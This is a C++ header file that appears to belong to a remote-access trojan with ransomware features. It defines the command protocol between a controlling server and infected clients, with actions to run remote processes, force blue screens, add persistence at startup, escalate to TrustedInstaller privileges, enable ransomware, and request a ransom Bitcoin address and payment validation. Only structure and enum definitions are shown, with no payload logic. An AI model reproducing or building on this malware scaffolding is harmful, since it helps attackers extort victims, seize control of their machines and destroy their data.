#pragma once

#include "Win32Natives.h"
#include "openssl/rsa.h"

#include <vector>
#include <string>

typedef std::vector<unsigned char> BYTESTRING;

constexpr USHORT MAX_BUFFER_LEN = 512;

// bitwise flags optionally included in packets....
const int NO_CONSOLE          = 1 << 0; // default is to make a console when a command is ran on remote host
const int RUN_AS_HIGHEST      = 1 << 1; // try to get highest privellages (trusted installer) and run as that
const int RUN_AS_NORMAL       = 1 << 2; // run as whatever privellages are available
const int USE_CLI             = 1 << 3; // use command prompt
const int RESPOND_WITH_STATUS = 1 << 4; // server wants a response
const int PACKET_IS_A_COMMAND = 1 << 5; // this packet is a command and the action in the packet must be performed

// Response codes sent from the client to the server
// Usually after a remoteaction is completed
enum ClientResponseCode {
    kResponseOk    = 6,
    kResponseError = -1,
    kTimeout       = -2,
};

// Enums dictating which action to perform on the client
// Sent from the server to client
enum RemoteAction {
    kNone,
    kOpenRemoteProcess,
    kKillClient, // forcefully disconnect the client from the server
    kPingClient,
    kKeepAlive,
    kRemoteBSOD, // cause a blue screen of death
    kAddToStartup,
    kRemoteShutdown, // shut down the client machine
    kRansomwareEnable, // dangerous, enable ransomware on client machine
    kReturnPrivateRSAKey,
};

enum SocketTypes {
    UDP,
    TCP,
};

/*
    A struct representing a server that
    clients can connect to and send requests on.
    Servers have a socket file descriptor which is used
    to send and receive information over sockets.
*/
struct Server {
    SOCKET             sfd;      // Socket File Descriptor
    int                domain;   
    int                type;     // Communcation semmantic type.
    int                protocol; // Server protocol. All server protocols will be 0.
    int                port;     
    sockaddr_in        addr;     // address struct with info on the server address
    BOOL               alive;    // is server on
    BOOL               accepting; // accepting connections
    
    Server()
        : sfd(INVALID_SOCKET), domain(AF_INET), type(-1),
        protocol(0), port(-1), addr({0}), alive(FALSE), accepting(FALSE)
    {
    }
};

/*
    A struct representing a message sent from
    a client to a server. 
*/
struct ClientResponse {
    ClientResponseCode responseCode = kResponseError;
    RemoteAction actionPerformed = kNone;
    char buffer[MAX_BUFFER_LEN]; // base64 encoded aes response i.e output of system()
    size_t buffLen;
};

#include "External/base64.h"

/*
    Packet of information sent over sockets.
*/
#pragma pack(push, 1)
struct Packet {
    char buffer[MAX_BUFFER_LEN];
    size_t buffLen;
    RemoteAction action;
    int flags;

    inline const void insert(char* s) { 
        errno_t copied = strcpy_s(buffer, s); 
        buffLen = (copied == 0) ? strlen(s) : -1; 
    }

    inline const void insert(std::string s) { 
        strncpy_s(buffer, s.c_str(), sizeof(buffer) - 1);
        buffLen = s.length();
    }
};
#pragma pack(pop, 0)

/*
    When a client requests the tcp server to do something
*/
struct ClientRequest {
    enum Action {
        kNone = 0,
        kConnectClient,
        kRequestPublicEncryptionKey,
        kRequestPrivateEncryptionKey,
        kValidateRansomPayment,
        kRequestRansomBTCAddress,
        kPing,
        kDisconnectClient,
        kGetRequestEncryptionKeys,
        kGetRequestEncryptionKeyPrivate,
        kGetRequestEncryptionKeyPublic
    };

    BOOL              valid;
    Action            action;
    SOCKET            udp;
    SOCKET            tcp;
    
    ClientRequest() = default;
    ClientRequest(
        Action todo, SOCKET tcp = INVALID_SOCKET, SOCKET udp = INVALID_SOCKET
    ) : valid(TRUE), action(todo), udp(udp), tcp(tcp)
    {
    }
};

struct RSAKeys {
    RSA* pub;
    RSA* priv;
};

typedef ClientRequest ClientMessage;
typedef Packet ServerCommand, ServerRequest, ServerResponse;
